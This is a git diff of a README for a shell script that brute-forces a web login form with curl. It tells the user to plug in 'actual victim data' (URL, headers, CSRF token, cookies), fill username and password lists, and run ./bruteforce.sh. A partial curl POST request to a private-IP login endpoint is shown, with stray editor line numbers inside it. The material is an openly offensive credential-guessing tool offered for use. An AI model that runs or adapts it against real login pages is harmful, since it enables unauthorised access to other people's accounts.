@@ -1,7 +1,7 @@
 # Overview
 Brute force using curl for user/passford fields
 ## Getting started
-Change url/headers/X-CSRF-Token/cookies to actual victim data
+1. Change url/headers/X-CSRF-Token/cookies to actual victim data
 ```
 Request (){
   5 curl -o /dev/null -s -w "%{http_code}\n" -X POST -H "Content-Type: applicat    ion/json" \
@@ -18,4 +18,5 @@ Request (){
  16         http://172.16.4.3:8080/login
  17 }
 ```
-
+1. Add data to passwords.txt and usernames.txt files
+1. And than run the script ``` ./bruteforce.sh ```
